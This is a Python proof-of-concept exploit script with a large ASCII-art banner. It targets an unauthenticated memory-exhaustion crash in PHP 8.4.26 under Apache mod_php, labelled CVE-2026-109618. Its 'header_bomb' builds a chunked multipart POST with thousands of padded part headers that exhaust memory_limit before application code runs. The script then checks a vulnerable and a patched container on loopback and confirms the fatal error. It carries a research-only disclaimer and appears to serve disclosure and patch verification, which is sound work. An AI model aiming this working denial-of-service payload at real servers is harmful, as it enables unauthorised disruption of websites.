#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: CVE-2026-109618 (Critical: 9.2)
#  Vendor: PHP (The PHP Group)
#  Versions: PHP 8.4.26 apache2handler (fixed in 8.4.27)
#  Impact: Unauth OOM longjmp during multipart parse before app code
#  Requires: Apache mod_php; finite memory_limit; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "CVE-2026-109618"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Mail", _EMAIL),):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs"
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Loopback lab for CVE-2026-109618: OOM longjmp during multipart parse.

Unauthenticated chunked multipart with extra part headers spends memory_limit
during rfc1867, before application code. Official php:8.4.26-apache returns
"Unknown on line 0". php:8.4.27-apache stays up and runs index.php.
"""

import os
import socket
import subprocess
from collections.abc import Callable
from dataclasses import dataclass
from pathlib import Path

LABEL = "CVE-2026-109618"
WITNESS = "CVE-2026-109618-OOM-WITNESS"
HOST = "127.0.0.1"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "cve-2026-109618")
HERE = Path(__file__).resolve().parent
SAPI = "apache2handler"
ALIVE = "CVE-2026-109618-ALIVE"
BOUNDARY = "----CVE2026109618OOM"
INDEX_PATH = "/index.php"
TRIGGER_NAME = "header-bomb-chunked"
HOW = "oom-longjmp-startup-fatal"
TIMEOUT_S = 40.0
CHUNK_SIZE = 8192
RECV_LIMIT = 2_000_000
PART_HEADER_COUNT = 3000
PART_HEADER_SIZE = 2500
VULN_IMAGE = "php:8.4.26-apache"
PATCHED_IMAGE = "php:8.4.27-apache"
VULN_PORT = 18220
PATCHED_PORT = 18221
VULN_VERSION = "8.4.26"
PATCHED_VERSION = "8.4.27"

_RESET = (ConnectionResetError, ConnectionAbortedError, BrokenPipeError)
_TIMEOUT = (TimeoutError, socket.timeout)
_OOM = ("allowed memory size", "out of memory", "exhausted")
_CRASH = (
    "segmentation fault",
    "exit signal",
    "zend_mm_heap corrupted",
    "addresssanitizer",
    "heap-use-after-free",
    "heap-buffer-overflow",
    "signal 11",
    "sigsegv",
)


@dataclass(frozen=True, slots=True)
class Target:
    name: str
    port: int
    image: str
    version: str


@dataclass(frozen=True, slots=True)
class HttpResult:
    complete: bool
    reset: bool
    timeout: bool
    status: int
    headers: str
    body: bytes
    error: str
    sent: int

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", "replace")


VULN = Target("vuln", VULN_PORT, VULN_IMAGE, VULN_VERSION)
PATCHED = Target("patched", PATCHED_PORT, PATCHED_IMAGE, PATCHED_VERSION)


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 240) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def service_logs(service: str, tail: int = 250) -> str:
    proc = compose("logs", "--no-color", "--tail", str(tail), service, timeout=30)
    return (proc.stdout or "") + (proc.stderr or "")


def service_status() -> str:
    proc = compose("ps", "-a", "--format", "{{.Service}} {{.Status}}", timeout=30)
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def _recv_all(sock: socket.socket) -> bytes:
    chunks = bytearray()
    while len(chunks) < RECV_LIMIT:
        piece = sock.recv(65536)
        if not piece:
            break
        chunks.extend(piece)
    return bytes(chunks)


def _parse_http(blob: bytes) -> tuple[int, str, bytes]:
    if not blob:
        return 0, "", b""
    head, sep, body = blob.partition(b"\r\n\r\n")
    if not sep:
        return 0, blob.decode("latin-1", "replace"), b""
    header_text = head.decode("latin-1", "replace")
    parts = header_text.split("\r\n", 1)[0].split()
    status = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
    return status, header_text, body


def _failed(exc: BaseException, sent: int) -> HttpResult:
    if isinstance(exc, _TIMEOUT):
        return HttpResult(False, False, True, 0, "", b"", "timeout", sent)
    err = str(exc)
    reset = isinstance(exc, _RESET) or any(
        tok in err.lower() for tok in ("reset", "broken pipe", "connection abort")
    )
    return HttpResult(False, reset, False, 0, "", b"", err, sent)


def _exchange(port: int, send: Callable[[socket.socket], int]) -> HttpResult:
    sent = 0
    try:
        with socket.create_connection((HOST, port), TIMEOUT_S) as sock:
            sock.settimeout(TIMEOUT_S)
            sent = send(sock)
            sock.shutdown(socket.SHUT_WR)
            raw = _recv_all(sock)
    except OSError as exc:
        return _failed(exc, sent)
    status, headers, body = _parse_http(raw)
    return HttpResult(True, False, False, status, headers, body, "", sent)


def _http_request(port: int, header: bytes, body: bytes = b"", *, chunked: bool) -> HttpResult:
    def send(sock: socket.socket) -> int:
        sock.sendall(header)
        if not chunked:
            if body:
                sock.sendall(body)
            return len(header) + len(body)
        view = memoryview(body)
        for start in range(0, len(body), CHUNK_SIZE):
            piece = view[start : start + CHUNK_SIZE]
            sock.sendall(f"{len(piece):x}\r\n".encode("ascii"))
            sock.sendall(piece)
            sock.sendall(b"\r\n")
        sock.sendall(b"0\r\n\r\n")
        return len(header) + len(body)

    return _exchange(port, send)


def _request_line(method: str, port: int, extra: str) -> bytes:
    return (
        f"{method} {INDEX_PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{port}\r\n"
        f"{extra}"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii")


def get_probe(port: int) -> HttpResult:
    return _http_request(port, _request_line("GET", port, ""), chunked=False)


def _form_field(name: str, value: str) -> bytes:
    return (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n'
        "\r\n"
        f"{value}\r\n"
    ).encode("ascii")


def header_bomb() -> bytes:
    """One multipart part whose in-memory headers dwarf the wire body."""
    pad = "B" * PART_HEADER_SIZE
    extra = "".join(f"X-Pad-{i}: {pad}\r\n" for i in range(PART_HEADER_COUNT))
    part = (
        f"--{BOUNDARY}\r\n"
        'Content-Disposition: form-data; name="h"; filename="x"\r\n'
        f"{extra}"
        "\r\n"
        "Z\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode("ascii")
    return (
        _form_field("PHP_SESSION_UPLOAD_PROGRESS", "oomlab")
        + _form_field("PHPSESSID", "oomlabid")
        + part
    )


def send_trigger(port: int, body: bytes) -> HttpResult:
    # Chunked, no Content-Length: walk past the first post_max_size gate.
    extra = (
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        "Transfer-Encoding: chunked\r\n"
    )
    return _http_request(port, _request_line("POST", port, extra), body, chunked=True)


def summarize(name: str, result: HttpResult) -> None:
    log(
        f"{name} complete={int(result.complete)} reset={int(result.reset)} "
        f"timeout={int(result.timeout)} status={result.status} sent={result.sent} "
        f"error={result.error!r} headers={clip(result.headers, 180)!r} "
        f"body={clip(result.text, 180)!r}"
    )


def is_alive(result: HttpResult) -> bool:
    return result.complete and not result.reset and result.status == 200 and ALIVE in result.text


def _has(blob: str, needles: tuple[str, ...]) -> bool:
    low = blob.lower()
    return any(token in low for token in needles)


def oom_startup_fatal(result: HttpResult, logs: str) -> bool:
    if ALIVE in result.text:
        return False
    text = result.text.lower()
    body_hit = "allowed memory size" in text and "unknown" in text and "on line" in text
    log_hit = _has(logs, _OOM) and "unknown on line 0" in logs.lower()
    return body_hit or log_hit


def ioc_logs(service: str, logs: str, status: str) -> None:
    log(f"IOC {service}-status {status!r}")
    hits = 0
    for line in logs.splitlines():
        low = line.lower()
        if not any(tok in low for tok in ("fatal", "memory", "exhausted", "unknown", "signal", "zend_mm")):
            continue
        log(f"IOC {service}-log {clip(line.strip(), 300)}")
        hits += 1
        if hits >= 16:
            break


def main() -> int:
    log(
        f"label={LABEL} vuln={HOST}:{VULN.port} patched={HOST}:{PATCHED.port} "
        f"vuln-image={VULN.image} patched-image={PATCHED.image} sapi={SAPI}"
    )

    vuln_get = get_probe(VULN.port)
    patched_get = get_probe(PATCHED.port)
    summarize("vuln-get", vuln_get)
    summarize("patched-get", patched_get)
    if not is_alive(vuln_get):
        return fail("vuln-get-not-alive")
    if not is_alive(patched_get):
        return fail("patched-get-not-alive")
    if VULN.version not in vuln_get.text:
        return fail("vuln-not-8.4.26")
    if PATCHED.version not in patched_get.text:
        return fail("patched-not-8.4.27")

    body = header_bomb()
    log(f"== trigger {TRIGGER_NAME} bytes={len(body)} chunked=1 ==")

    patched = send_trigger(PATCHED.port, body)
    summarize(f"patched-{TRIGGER_NAME}", patched)
    patched_logs = service_logs(PATCHED.name)
    ioc_logs(PATCHED.name, patched_logs, service_status())
    patched_after = get_probe(PATCHED.port)
    summarize("patched-after", patched_after)
    if not is_alive(patched) or not is_alive(patched_after) or _has(patched_logs, _CRASH):
        return fail("patched-not-ok")

    vuln = send_trigger(VULN.port, body)
    summarize(f"vuln-{TRIGGER_NAME}", vuln)
    vuln_logs = service_logs(VULN.name)
    ioc_logs(VULN.name, vuln_logs, service_status())
    vuln_after = get_probe(VULN.port)
    patched_final = get_probe(PATCHED.port)
    summarize("vuln-after", vuln_after)
    summarize("patched-final", patched_final)
    if not oom_startup_fatal(vuln, vuln_logs):
        return fail("vuln-no-oom-longjmp")
    if not is_alive(patched_final):
        return fail("patched-died-after")

    log(
        f"SUCCESS {LABEL} vuln-crash=yes patched-ok=yes sapi={SAPI} "
        f"vuln-image={VULN.image} patched-image={PATCHED.image} "
        f"how={HOW} trigger={TRIGGER_NAME} asan=no {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

